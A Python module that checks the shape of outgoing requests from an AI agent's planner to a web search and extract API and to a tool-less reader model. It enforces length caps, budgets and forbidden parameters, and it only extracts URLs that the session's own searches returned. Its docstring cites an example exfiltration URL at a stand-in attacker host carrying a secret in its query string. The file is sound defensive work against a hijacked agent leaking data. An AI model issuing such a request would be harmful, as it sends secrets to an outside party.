"""
checks/shape.py: RULE 4, "shape.*". Is this a normal-looking request at all?

The leak rules (canary, secrets, provenance) look at WHAT is said. Shape looks at HOW MUCH and WHERE:

  shape.bad_payload      search without a string query, extract without a URL list, etc.
  shape.length           query longer than MAX_QUERY_CHARS, or the body bigger than its size cap. A long query is
                         the easiest way to smuggle a paragraph of memo.
  shape.budget           the session already made MAX_CALLS attempts, or spent MAX_CREDITS Tavily credits. Stops a
                         runaway or hijacked loop. call_count / credits_used are read as "already used BEFORE this
                         call" (the Gate increments them after each attempt).
  shape.forbidden_param  `auto_parameters` (Tavily may silently switch to advanced depth and cost more), or `urls`
                         in a search body (searches never carry URLs).
  shape.extract_url      extract on a URL this session's searches did NOT return. Otherwise a planner could ask
                         Tavily to fetch "https://attacker.example/log?d=<secret>" and the attacker reads their
                         own server log. Planner sends result ids; the Gate maps them to URLs; we re-check here.
  shape.extract_query    the extract `query` (used by Tavily for reranking) is not a query this session already
                         sent. The Gate copies it from the earlier search, so anything else is new text that
                         skipped the checks.
  shape.reader_tools     a Reader (Anthropic) body with `tools` or `tool_choice`. The Reader has no tools
                         (invariant 3); this is a second lock on that door.
"""

from checks import config

_TAVILY_KINDS = ("search", "extract")


def check(body, payload_bytes, session, kind):
    """body: the parsed JSON object. payload_bytes: len of the UTF-8 payload. Returns None or (rule, detail)."""
    # ---- well-formed for its kind --------------------------------------------------------------------------
    if kind == "search":
        q = body.get("query")
        if not isinstance(q, str) or not q.strip():
            return "shape.bad_payload", "search body has no query string"
        if len(q) > config.MAX_QUERY_CHARS:
            return "shape.length", "query is %d chars (cap %d)" % (len(q), config.MAX_QUERY_CHARS)
        if "auto_parameters" in body:
            return "shape.forbidden_param", "auto_parameters is not allowed"
        if "urls" in body:
            return "shape.forbidden_param", "a search body may not carry urls"
    elif kind == "extract":
        urls = body.get("urls")
        if not isinstance(urls, list) or not all(isinstance(u, str) for u in urls):
            return "shape.bad_payload", "extract body has no url list"
        if not urls:
            return "shape.extract_url", "extract with no urls"
        if len(urls) > config.MAX_EXTRACT_URLS:
            return "shape.length", "extract with %d urls (cap %d)" % (len(urls), config.MAX_EXTRACT_URLS)
        returned = set(session.get("urls_returned") or []) | set((session.get("result_ids") or {}).values())
        if any(u not in returned for u in urls):
            return "shape.extract_url", "extract on a url this session did not return"
        q = body.get("query")
        if q is not None:
            if not isinstance(q, str) or q not in (session.get("queries_sent") or []):
                return "shape.extract_query", "extract query is not a query this session already sent"
            if len(q) > config.MAX_QUERY_CHARS:
                return "shape.length", "query is %d chars (cap %d)" % (len(q), config.MAX_QUERY_CHARS)
        if "auto_parameters" in body:
            return "shape.forbidden_param", "auto_parameters is not allowed"
    elif kind == "reader":
        if "tools" in body or "tool_choice" in body:
            return "shape.reader_tools", "reader requests may not carry tools"

    # ---- size cap on the whole body -------------------------------------------------------------------------
    cap = config.MAX_READER_BODY_BYTES if kind == "reader" else config.MAX_TAVILY_BODY_BYTES
    if payload_bytes > cap:
        return "shape.length", "body is %d bytes (cap %d)" % (payload_bytes, cap)

    # ---- session budget ----------------------------------------------------------------------------------------
    if int(session.get("call_count") or 0) >= config.MAX_CALLS:
        return "shape.budget", "session call budget (%d) used up" % config.MAX_CALLS
    if kind in _TAVILY_KINDS and int(session.get("credits_used") or 0) >= config.MAX_CREDITS:
        return "shape.budget", "session Tavily credit budget (%d) used up" % config.MAX_CREDITS
    return None
